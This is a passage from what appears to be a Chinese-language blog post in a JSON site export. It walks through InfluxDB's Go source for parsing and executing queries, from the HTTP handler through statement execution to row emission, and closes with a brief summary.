strconv.ParseUint(r.FormValue(\"node_id\"), 10, 64)\n\n\tvar qr io.Reader\n\t// Attempt to read the form value from the \"q\" form value.\n\tif qp := strings.TrimSpace(r.FormValue(\"q\")); qp != \"\" {\n\t\tqr = strings.NewReader(qp)\n\t} else if r.MultipartForm != nil && r.MultipartForm.File != nil {\n\t\t// If we have a multipart/form-data, try to retrieve a file from 'q'.\n\t\tif fhs := r.MultipartForm.File[\"q\"]; len(fhs) > 0 {\n\t\t\tf, err := fhs[0].Open()\n\t\t\tif err != nil {\n\t\t\t\th.httpError(rw, err.Error(), http.StatusBadRequest)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdefer f.Close()\n\t\t\tqr = f\n\t\t}\n\t}\n\n\tif qr == nil {\n\t\th.httpError(rw, `missing required parameter \"q\"`, http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tepoch := strings.TrimSpace(r.FormValue(\"epoch\"))\n\t// 初始化查询解析器\n\tp := influxql.NewParser(qr)\n\tdb := r.FormValue(\"db\")\n\n\t// Sanitize the request query params so it doesn't show up in the response logger.\n\t// Do this before anything else so a parsing error doesn't leak passwords.\n\tsanitize(r)\n\n\t// Parse the parameters\n\trawParams := r.FormValue(\"params\")\n\tif rawParams != \"\" {\n\t\tvar params map[string]interface{}\n\t\tdecoder := json.NewDecoder(strings.NewReader(rawParams))\n\t\tdecoder.UseNumber()\n\t\tif err := decoder.Decode(&params); err != nil {\n\t\t\th.httpError(rw, \"error parsing query parameters: \"+err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\t// Convert json.Number into int64 and float64 values\n\t\tfor k, v := range params {\n\t\t\tif v, ok := v.(json.Number); ok {\n\t\t\t\tvar err error\n\t\t\t\tif strings.Contains(string(v), \".\") {\n\t\t\t\t\tparams[k], err = v.Float64()\n\t\t\t\t} else {\n\t\t\t\t\tparams[k], err = v.Int64()\n\t\t\t\t}\n\n\t\t\t\tif err != nil {\n\t\t\t\t\th.httpError(rw, \"error parsing json value: \"+err.Error(), http.StatusBadRequest)\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tp.SetParams(params)\n\t}\n\n\t// Parse query from query string.\n    //开始解析query查询语句\n\tq, err := p.ParseQuery()\n\tif err != nil {\n\t\th.httpError(rw, \"error parsing query: \"+err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// Check authorization.\n    //检查认证信息\n\tif h.Config.AuthEnabled {\n\t\tif err := h.QueryAuthorizer.AuthorizeQuery(user, q, db); err != nil {\n\t\t\tif err, ok := err.(meta.ErrAuthorize); ok {\n\t\t\t\th.Logger.Info(\"Unauthorized request\",\n\t\t\t\t\tzap.String(\"user\", err.User),\n\t\t\t\t\tzap.Stringer(\"query\", err.Query),\n\t\t\t\t\tlogger.Database(err.Database))\n\t\t\t}\n\t\t\th.httpError(rw, \"error authorizing query: \"+err.Error(), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t}\n\n\t// Parse chunk size. Use default if not provided or unparsable.\n\tchunked := r.FormValue(\"chunked\") == \"true\"\n\tchunkSize := DefaultChunkSize\n\tif chunked {\n\t\tif n, err := strconv.ParseInt(r.FormValue(\"chunk_size\"), 10, 64); err == nil && int(n) > 0 {\n\t\t\tchunkSize = int(n)\n\t\t}\n\t}\n\n\t// Parse whether this is an async command.\n\tasync := r.FormValue(\"async\") == \"true\"\n//参数实例化\n\topts := query.ExecutionOptions{\n\t\tDatabase:        db,\n\t\tRetentionPolicy: r.FormValue(\"rp\"),\n\t\tChunkSize:       chunkSize,\n\t\tReadOnly:        r.Method == \"GET\",\n\t\tNodeID:          nodeID,\n\t}\n\n\tif h.Config.AuthEnabled {\n\t\t// The current user determines the authorized actions.\n\t\topts.Authorizer = user\n\t} else {\n\t\t// Auth is disabled, so allow everything.\n\t\topts.Authorizer = query.OpenAuthorizer\n\t}\n\n\t// Make sure if the client disconnects we signal the query to abort\n\tvar closing chan struct{}\n\tif !async {\n\t\tclosing = make(chan struct{})\n\t\tif notifier, ok := w.(http.CloseNotifier); ok {\n\t\t\t// CloseNotify() is not guaranteed to send a notification when the query\n\t\t\t// is closed. Use this channel to signal that the query is finished to\n\t\t\t// prevent lingering goroutines that may be stuck.\n\t\t\tdone := make(chan struct{})\n\t\t\tdefer close(done)\n\n\t\t\tnotify := notifier.CloseNotify()\n\t\t\tgo func() {\n\t\t\t\t// Wait for either the request to finish\n\t\t\t\t// or for the client to disconnect\n\t\t\t\tselect {\n\t\t\t\tcase <-done:\n\t\t\t\tcase <-notify:\n\t\t\t\t\tclose(closing)\n\t\t\t\t}\n\t\t\t}()\n\t\t\topts.AbortCh = done\n\t\t} else {\n\t\t\tdefer close(closing)\n\t\t}\n\t}\n\n\t// Execute query.\n    //执行查询语句\n\tresults := h.QueryExecutor.ExecuteQuery(q, opts, closing)\n\n\t// If we are running in async mode, open a goroutine to drain the results\n\t// and return with a StatusNoContent.\n\tif async {\n\t\tgo h.async(q, results)\n\t\th.writeHeader(w, http.StatusNoContent)\n\t\treturn\n\t}\n\n\t// if we're not chunking, this will be the in memory buffer for all results before sending to client\n\tresp := Response{Results: make([]*query.Result, 0)}\n\n\t// Status header is OK once this point is reached.\n\t// Attempt to flush the header immediately so the client gets the header information\n\t// and knows the query was accepted.\n\th.writeHeader(rw, http.StatusOK)\n\tif w, ok := w.(http.Flusher); ok {\n\t\tw.Flush()\n\t}\n\n\t// pull all results from the channel\n\trows := 0\n\tfor r := range results {\n\t\t// Ignore nil results.\n\t\tif r == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\t// if requested, convert result timestamps to epoch\n\t\tif epoch != \"\" {\n\t\t\tconvertToEpoch(r, epoch)\n\t\t}\n\n\t\t// Write out result immediately if chunked.\n\t\tif chunked {\n\t\t\tn, _ := rw.WriteResponse(Response{\n\t\t\t\tResults: []*query.Result{r},\n\t\t\t})\n\t\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t\t\tw.(http.Flusher).Flush()\n\t\t\tcontinue\n\t\t}\n\n\t\t// Limit the number of rows that can be returned in a non-chunked\n\t\t// response.  This is to prevent the server from going OOM when\n\t\t// returning a large response.  If you want to return more than the\n\t\t// default chunk size, then use chunking to process multiple blobs.\n\t\t// Iterate through the series in this result to count the rows and\n\t\t// truncate any rows we shouldn't return.\n        //最大限制数目\n\t\tif h.Config.MaxRowLimit > 0 {\n\t\t\tfor i, series := range r.Series {\n\t\t\t\tn := h.Config.MaxRowLimit - rows\n\t\t\t\tif n < len(series.Values) {\n\t\t\t\t\t// We have reached the maximum number of values. Truncate\n\t\t\t\t\t// the values within this row.\n\t\t\t\t\tseries.Values = series.Values[:n]\n\t\t\t\t\t// Since this was truncated, it will always be a partial return.\n\t\t\t\t\t// Add this so the client knows we truncated the response.\n\t\t\t\t\tseries.Partial = true\n\t\t\t\t}\n\t\t\t\trows += len(series.Values)\n\n\t\t\t\tif rows >= h.Config.MaxRowLimit {\n\t\t\t\t\t// Drop any remaining series since we have already reached the row limit.\n\t\t\t\t\tif i < len(r.Series) {\n\t\t\t\t\t\tr.Series = r.Series[:i+1]\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// It's not chunked so buffer results in memory.\n\t\t// Results for statements need to be combined together.\n\t\t// We need to check if this new result is for the same statement as\n\t\t// the last result, or for the next statement\n\t\tl := len(resp.Results)\n\t\tif l == 0 {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t} else if resp.Results[l-1].StatementID == r.StatementID {\n\t\t\tif r.Err != nil {\n\t\t\t\tresp.Results[l-1] = r\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tcr := resp.Results[l-1]\n\t\t\trowsMerged := 0\n\t\t\tif len(cr.Series) > 0 {\n\t\t\t\tlastSeries := cr.Series[len(cr.Series)-1]\n\n\t\t\t\tfor _, row := range r.Series {\n\t\t\t\t\tif !lastSeries.SameSeries(row) {\n\t\t\t\t\t\t// Next row is for a different series than last.\n\t\t\t\t\t\tbreak\n\t\t\t\t\t}\n\t\t\t\t\t// Values are for the same series, so append them.\n\t\t\t\t\tlastSeries.Values = append(lastSeries.Values, row.Values...)\n\t\t\t\t\trowsMerged++\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Append remaining rows as new rows.\n\t\t\tr.Series = r.Series[rowsMerged:]\n\t\t\tcr.Series = append(cr.Series, r.Series...)\n\t\t\tcr.Messages = append(cr.Messages, r.Messages...)\n\t\t\tcr.Partial = r.Partial\n\t\t} else {\n\t\t\tresp.Results = append(resp.Results, r)\n\t\t}\n\n\t\t// Drop out of this loop and do not process further results when we hit the row limit.\n\t\tif h.Config.MaxRowLimit > 0 && rows >= h.Config.MaxRowLimit {\n\t\t\t// If the result is marked as partial, remove that partial marking\n\t\t\t// here. While the series is partial and we would normally have\n\t\t\t// tried to return the rest in the next chunk, we are not using\n\t\t\t// chunking and are truncating the series so we don't want to\n\t\t\t// signal to the client that we plan on sending another JSON blob\n\t\t\t// with another result.  The series, on the other hand, still\n\t\t\t// returns partial true if it was truncated or had more data to\n\t\t\t// send in a future chunk.\n\t\t\tr.Partial = false\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// If it's not chunked we buffered everything in memory, so write it out\n\tif !chunked {\n\t\tn, _ := rw.WriteResponse(resp)\n\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t}\n}\n```\n\n函数ParseQuery函数解析query：\n\n```go\n// ParseQuery parses an InfluxQL string and returns a Query AST object.\nfunc (p *Parser) ParseQuery() (*Query, error) {\n\tvar statements Statements\n\tsemi := true\n\n\tfor {\n\t\tif tok, pos, lit := p.ScanIgnoreWhitespace(); tok == EOF {//如果tok==EOF的时候，正常解析完成返回;\n\t\t\treturn &Query{Statements: statements}, nil\n\t\t} else if tok == SEMICOLON {\n\t\t\tsemi = true\n\t\t} else {\n\t\t\tif !semi {\n\t\t\t\treturn nil, newParseError(tokstr(tok, lit), []string{\";\"}, pos)\n\t\t\t}\n\t\t\tp.Unscan()\n\t\t\ts, err := p.ParseStatement() //解析词\n\t\t\tif err != nil {\n\t\t\t\treturn nil, err\n\t\t\t}\n\t\t\tstatements = append(statements, s) //返回解析的statments\n\t\t\tsemi = false\n\t\t}\n\t}\n}\n```\n\n执行解析的executeQuery函数：\n\n```go\n// ExecuteQuery executes each statement within a query.\nfunc (e *Executor) ExecuteQuery(query *influxql.Query, opt ExecutionOptions, closing chan struct{}) <-chan *Result {\n\tresults := make(chan *Result)\n\tgo e.executeQuery(query, opt, closing, results)  //执行查询语句\n\treturn results\n}\n```\n\n调用executeQuery函数：\n\n```go\nfunc (e *Executor) executeQuery(query *influxql.Query, opt ExecutionOptions, closing <-chan struct{}, results chan *Result) {\n\tdefer close(results)\n\tdefer e.recover(query, results)\n\n\tatomic.AddInt64(&e.stats.ActiveQueries, 1)\n\tatomic.AddInt64(&e.stats.ExecutedQueries, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&e.stats.ActiveQueries, -1)\n\t\tatomic.AddInt64(&e.stats.FinishedQueries, 1)\n\t\tatomic.AddInt64(&e.stats.QueryExecutionDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n// 使用taskManager来管理查询query,返回一个channel，当query完成running的时候。\n\tctx, detach, err := e.TaskManager.AttachQuery(query, opt, closing)\n\tif err != nil {\n\t\tselect {\n\t\tcase results <- &Result{Err: err}:\n\t\tcase <-opt.AbortCh:\n\t\t}\n\t\treturn\n\t}\n\tdefer detach()\n\n\t// Setup the execution context that will be used when executing statements.\n\tctx.Results = results\n\n\tvar i int\nLOOP:\n\tfor ; i < len(query.Statements); i++ {\n\t\tctx.statementID = i\n\t\tstmt := query.Statements[i]\n\n\t\t// If a default database wasn't passed in by the caller, check the statement.\n\t\tdefaultDB := opt.Database\n\t\tif defaultDB == \"\" {\n\t\t\tif s, ok := stmt.(influxql.HasDefaultDatabase); ok {\n\t\t\t\tdefaultDB = s.DefaultDatabase()\n\t\t\t}\n\t\t}\n\n\t\t// Do not let queries manually use the system measurements. If we find\n\t\t// one, return an error. This prevents a person from using the\n\t\t// measurement incorrectly and causing a panic.\n\t\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\t\tfor _, s := range stmt.Sources {\n\t\t\t\tswitch s := s.(type) {\n\t\t\t\tcase *influxql.Measurement:\n\t\t\t\t\tif influxql.IsSystemName(s.Name) {\n\t\t\t\t\t\tcommand := \"the appropriate meta command\"\n\t\t\t\t\t\tswitch s.Name {\n\t\t\t\t\t\tcase \"_fieldKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW FIELD KEYS\"\n\t\t\t\t\t\tcase \"_measurements\":\n\t\t\t\t\t\t\tcommand = \"SHOW MEASUREMENTS\"\n\t\t\t\t\t\tcase \"_series\":\n\t\t\t\t\t\t\tcommand = \"SHOW SERIES\"\n\t\t\t\t\t\tcase \"_tagKeys\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG KEYS\"\n\t\t\t\t\t\tcase \"_tags\":\n\t\t\t\t\t\t\tcommand = \"SHOW TAG VALUES\"\n\t\t\t\t\t\t}\n\t\t\t\t\t\tresults <- &Result{\n\t\t\t\t\t\t\tErr: fmt.Errorf(\"unable to use system source '%s': use %s instead\", s.Name, command),\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak LOOP\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Rewrite statements, if necessary.\n\t\t// This can occur on meta read statements which convert to SELECT statements.\n\t\tnewStmt, err := RewriteStatement(stmt)\n\t\tif err != nil {\n\t\t\tresults <- &Result{Err: err}\n\t\t\tbreak\n\t\t}\n\t\tstmt = newStmt\n\n\t\t// Normalize each statement if possible.\n\t\tif normalizer, ok := e.StatementExecutor.(StatementNormalizer); ok {\n\t\t\tif err := normalizer.NormalizeStatement(stmt, defaultDB, opt.RetentionPolicy); err != nil {\n\t\t\t\tif err := ctx.send(&Result{Err: err}); err == ErrQueryAborted {\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\n\t\t// Log each normalized statement.\n\t\tif !ctx.Quiet {\n\t\t\te.Logger.Info(\"Executing query\", zap.Stringer(\"query\", stmt))\n\t\t}\n\n\t\t// Send any other statements to the underlying statement executor.\n\t\terr = e.StatementExecutor.ExecuteStatement(stmt, ctx)\n\t\tif err == ErrQueryInterrupted {\n\t\t\t// Query was interrupted so retrieve the real interrupt error from\n\t\t\t// the query task if there is one.\n\t\t\tif qerr := ctx.Err(); qerr != nil {\n\t\t\t\terr = qerr\n\t\t\t}\n\t\t}\n\n\t\t// Send an error for this result if it failed for some reason.\n\t\tif err != nil {\n\t\t\tif err := ctx.send(&Result{\n\t\t\t\tStatementID: i,\n\t\t\t\tErr:         err,\n\t\t\t}); err == ErrQueryAborted {\n\t\t\t\treturn\n\t\t\t}\n\t\t\t// Stop after the first error.\n\t\t\tbreak\n\t\t}\n\n\t\t// Check if the query was interrupted during an uninterruptible statement.\n\t\tinterrupted := false\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tinterrupted = true\n\t\tdefault:\n\t\t\t// Query has not been interrupted.\n\t\t}\n\n\t\tif interrupted {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// Send error results for any statements which were not executed.\n\tfor ; i < len(query.Statements)-1; i++ {\n\t\tif err := ctx.send(&Result{\n\t\t\tStatementID: i,\n\t\t\tErr:         ErrNotExecuted,\n\t\t}); err == ErrQueryAborted {\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n函数AttachQuery用于管理当前查询的query的状态\n\n```go\n// AttachQuery attaches a running query to be managed by the TaskManager.\n// Returns the query id of the newly attached query or an error if it was\n// unable to assign a query id or attach the query to the TaskManager.\n// This function also returns a channel that will be closed when this\n// query finishes running.\n//\n// After a query finishes running, the system is free to reuse a query id.\nfunc (t *TaskManager) AttachQuery(q *influxql.Query, opt ExecutionOptions, interrupt <-chan struct{}) (*ExecutionContext, func(), error) {\n\tt.mu.Lock()\n\tdefer t.mu.Unlock()\n\n\tif t.shutdown {\n\t\treturn nil, nil, ErrQueryEngineShutdown\n\t}\n\n\tif t.MaxConcurrentQueries > 0 && len(t.queries) >= t.MaxConcurrentQueries {\n\t\treturn nil, nil, ErrMaxConcurrentQueriesLimitExceeded(len(t.queries), t.MaxConcurrentQueries)\n\t}\n\n\tqid := t.nextID\n    //初始化task\n\tquery := &Task{\n\t\tquery:     q.String(),\n\t\tdatabase:  opt.Database,\n\t\tstatus:    RunningTask,\n\t\tstartTime: time.Now(),\n\t\tclosing:   make(chan struct{}),\n\t\tmonitorCh: make(chan error),\n\t}\n\tt.queries[qid] = query\n\n\tgo t.waitForQuery(qid, query.closing, interrupt, query.monitorCh)//开启协程来监听query是否结束。\n\tif t.LogQueriesAfter != 0 {\n\t\tgo query.monitor(func(closing <-chan struct{}) error {\n\t\t\ttimer := time.NewTimer(t.LogQueriesAfter)//检测到慢查询的时候，报警。\n\t\t\tdefer timer.Stop()\n\n\t\t\tselect {\n\t\t\tcase <-timer.C:\n\t\t\t\tt.Logger.Warn(fmt.Sprintf(\"Detected slow query: %s (qid: %d, database: %s, threshold: %s)\",\n\t\t\t\t\tquery.query, qid, query.database, t.LogQueriesAfter))\n\t\t\tcase <-closing:\n\t\t\t}\n\t\t\treturn nil\n\t\t})\n\t}\n\tt.nextID++\n    //初始化一个ctx上下文\n\tctx := &ExecutionContext{\n\t\tContext:          context.Background(),\n\t\tQueryID:          qid,\n\t\ttask:             query,\n\t\tExecutionOptions: opt,\n\t}\n\tctx.watch()\n   \t// detach query，从查询table中去除。\n\treturn ctx, func() { t.DetachQuery(qid) }, nil\n    \n}\n```\n\n将解析出来的statement执行函数ExecuteStatement\n\n```go\n// ExecuteStatement executes the given statement with the given execution context.\nfunc (e *StatementExecutor) ExecuteStatement(stmt influxql.Statement, ctx *query.ExecutionContext) error {\n\t// Select statements are handled separately so that they can be streamed.\n    //特殊处理select查询\n\tif stmt, ok := stmt.(*influxql.SelectStatement); ok {\n\t\treturn e.executeSelectStatement(stmt, ctx)\n\t}\n\n\tvar rows models.Rows\n\tvar messages []*query.Message\n\tvar err error\n\tswitch stmt := stmt.(type) {\n     //根据每个类别分别处理不同type的查询语句，有点多，自己看下吧~~~\n\tcase *influxql.AlterRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeAlterRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateContinuousQueryStatement(stmt)\n\tcase *influxql.CreateDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateDatabaseStatement(stmt)\n\tcase *influxql.CreateRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateRetentionPolicyStatement(stmt)\n\tcase *influxql.CreateSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateSubscriptionStatement(stmt)\n\tcase *influxql.CreateUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeCreateUserStatement(stmt)\n\tcase *influxql.DeleteSeriesStatement:\n\t\terr = e.executeDeleteSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropContinuousQueryStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropContinuousQueryStatement(stmt)\n\tcase *influxql.DropDatabaseStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropDatabaseStatement(stmt)\n\tcase *influxql.DropMeasurementStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropMeasurementStatement(stmt, ctx.Database)\n\tcase *influxql.DropSeriesStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSeriesStatement(stmt, ctx.Database)\n\tcase *influxql.DropRetentionPolicyStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropRetentionPolicyStatement(stmt)\n\tcase *influxql.DropShardStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropShardStatement(stmt)\n\tcase *influxql.DropSubscriptionStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropSubscriptionStatement(stmt)\n\tcase *influxql.DropUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeDropUserStatement(stmt)\n\tcase *influxql.ExplainStatement:\n\t\tif stmt.Analyze {\n\t\t\trows, err = e.executeExplainAnalyzeStatement(stmt, ctx)\n\t\t} else {\n\t\t\trows, err = e.executeExplainStatement(stmt, ctx)\n\t\t}\n\tcase *influxql.GrantStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantStatement(stmt)\n\tcase *influxql.GrantAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeGrantAdminStatement(stmt)\n\tcase *influxql.RevokeStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeStatement(stmt)\n\tcase *influxql.RevokeAdminStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeRevokeAdminStatement(stmt)\n\tcase *influxql.ShowContinuousQueriesStatement:\n\t\trows, err = e.executeShowContinuousQueriesStatement(stmt)\n\tcase *influxql.ShowDatabasesStatement:\n\t\trows, err = e.executeShowDatabasesStatement(stmt, ctx)\n\tcase *influxql.ShowDiagnosticsStatement:\n\t\trows, err = e.executeShowDiagnosticsStatement(stmt)\n\tcase *influxql.ShowGrantsForUserStatement:\n\t\trows, err = e.executeShowGrantsForUserStatement(stmt)\n\tcase *influxql.ShowMeasurementsStatement:\n\t\treturn e.executeShowMeasurementsStatement(stmt, ctx)\n\tcase *influxql.ShowMeasurementCardinalityStatement:\n\t\trows, err = e.executeShowMeasurementCardinalityStatement(stmt)\n\tcase *influxql.ShowRetentionPoliciesStatement:\n\t\trows, err = e.executeShowRetentionPoliciesStatement(stmt)\n\tcase *influxql.ShowSeriesCardinalityStatement:\n\t\trows, err = e.executeShowSeriesCardinalityStatement(stmt)\n\tcase *influxql.ShowShardsStatement:\n\t\trows, err = e.executeShowShardsStatement(stmt)\n\tcase *influxql.ShowShardGroupsStatement:\n\t\trows, err = e.executeShowShardGroupsStatement(stmt)\n\tcase *influxql.ShowStatsStatement:\n\t\trows, err = e.executeShowStatsStatement(stmt)\n\tcase *influxql.ShowSubscriptionsStatement:\n\t\trows, err = e.executeShowSubscriptionsStatement(stmt)\n\tcase *influxql.ShowTagKeysStatement:\n\t\treturn e.executeShowTagKeys(stmt, ctx)\n\tcase *influxql.ShowTagValuesStatement:\n\t\treturn e.executeShowTagValues(stmt, ctx)\n\tcase *influxql.ShowUsersStatement:\n\t\trows, err = e.executeShowUsersStatement(stmt)\n\tcase *influxql.SetPasswordUserStatement:\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\t\terr = e.executeSetPasswordUserStatement(stmt)\n\tcase *influxql.ShowQueriesStatement, *influxql.KillQueryStatement:\n\t\t// Send query related statements to the task manager.\n\t\treturn e.TaskManager.ExecuteStatement(stmt, ctx)\n\tdefault:\n\t\treturn query.ErrInvalidQuery\n\t}\n\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn ctx.Send(&query.Result{\n\t\tSeries:   rows,\n\t\tMessages: messages,\n\t})\n}\n```\n\n针对不同类型的statment执行不同的查询tsdb过程。以select查询为例。，executeSelectStatement单独处理，为了能够streamed。\n\n```go\nfunc (e *StatementExecutor) executeSelectStatement(stmt *influxql.SelectStatement, ctx *query.ExecutionContext) error {\n\t//创建迭代器\n    cur, err := e.createIterators(ctx, stmt, ctx.ExecutionOptions)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Generate a row emitter from the iterator set.\n    // 从迭代器中生成一个row emitter，chunkSize大小。\n\tem := query.NewEmitter(cur, ctx.ChunkSize)\n\tdefer em.Close()\n\n\t// Emit rows to the results channel.\n\tvar writeN int64\n\tvar emitted bool\n\n\tvar pointsWriter *BufferedPointsWriter\n\tif stmt.Target != nil {\n        //初始化\n\t\tpointsWriter = NewBufferedPointsWriter(e.PointsWriter, stmt.Target.Measurement.Database, stmt.Target.Measurement.RetentionPolicy, 10000)\n\t}\n\n\tfor {\n        // 查询数据\n\t\trow, partial, err := em.Emit()\n\t\tif err != nil {\n\t\t\treturn err\n\t\t} else if row == nil {\n\t\t\t// Check if the query was interrupted while emitting.\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\treturn ctx.Err()\n\t\t\tdefault:\n\t\t\t}\n\t\t\tbreak\n\t\t}\n\n\t\t// Write points back into system for INTO statements.\n        // INTO不为空，则写入这个pointswriter\n\t\tif stmt.Target != nil {\n\t\t\tif err := e.writeInto(pointsWriter, stmt, row); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\twriteN += int64(len(row.Values))\n\t\t\tcontinue\n\t\t}\n\n\t\tresult := &query.Result{\n\t\t\tSeries:  []*models.Row{row},\n\t\t\tPartial: partial,\n\t\t}\n\n\t\t// Send results or exit if closing.\n        //发送结果\n\t\tif err := ctx.Send(result); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\temitted = true\n\t}\n\n\t// Flush remaining points and emit write count if an INTO statement.\n\tif stmt.Target != nil {\n\t\tif err := pointsWriter.Flush(); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tvar messages []*query.Message\n\t\tif ctx.ReadOnly {\n\t\t\tmessages = append(messages, query.ReadOnlyWarning(stmt.String()))\n\t\t}\n\n\t\treturn ctx.Send(&query.Result{\n\t\t\tMessages: messages,\n\t\t\tSeries: []*models.Row{{\n\t\t\t\tName:    \"result\",\n\t\t\t\tColumns: []string{\"time\", \"written\"},\n\t\t\t\tValues:  [][]interface{}{{time.Unix(0, 0).UTC(), writeN}},\n\t\t\t}},\n\t\t})\n\t}\n\n\t// Always emit at least one result.\n\tif !emitted {\n\t\treturn ctx.Send(&query.Result{\n\t\t\tSeries: make([]*models.Row, 0),\n\t\t})\n\t}\n\n\treturn nil\n}\n```\n\nemit函数查询获取数据并返回:\n\n```go\n// Emit returns the next row from the iterators.\nfunc (e *Emitter) Emit() (*models.Row, bool, error) {\n\t// Continually read from the cursor until it is exhausted.\n\tfor {\n\t\t// Scan the next row. If there are no rows left, return the current row.\n\t\tvar row Row\n\t\tif !e.cur.Scan(&row) {\n\t\t\tif err := e.cur.Err(); err != nil {\n\t\t\t\treturn nil, false, err\n\t\t\t}\n\t\t\tr := e.row\n\t\t\te.row = nil\n\t\t\treturn r, false, nil\n\t\t}\n\n\t\t// If there's no row yet then create one.\n\t\t// If the name and tags match the existing row, append to that row if\n\t\t// the number of values doesn't exceed the chunk size.\n\t\t// Otherwise return existing row and add values to next emitted row.\n\t\tif e.row == nil {\n\t\t\te.createRow(row.Series, row.Values)\n\t\t} else if e.series.SameSeries(row.Series) {\n\t\t\tif e.chunkSize > 0 && len(e.row.Values) >= e.chunkSize {//如果查询数据量大于chunkSize，则返回，同时 partial=true标识。\n\t\t\t\tr := e.row\n\t\t\t\tr.Partial = true\n\t\t\t\te.createRow(row.Series, row.Values)\n\t\t\t\treturn r, true, nil\n\t\t\t}\n\t\t\te.row.Values = append(e.row.Values, row.Values)\n\t\t} else {\n\t\t\tr := e.row\n\t\t\te.createRow(row.Series, row.Values)\n\t\t\treturn r, true, nil\n\t\t}\n\t}\n}\n```\n\n\n\n #### 总结\n\n大概看了下influxdb从启动到服务查询接口的整体流程。以select为例，看了不同的query查询和解析方式类似，都需要走解析查询的。词法解析器是 influxdb自己写的。 底层如何构建的以后再讨论吧。还有很多细节需要自己去看下了。orz\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["influxdb"],"categories":["influxdb"]},{"title":"golang","url":"/2017/05/26/gotips/","content":"\n## 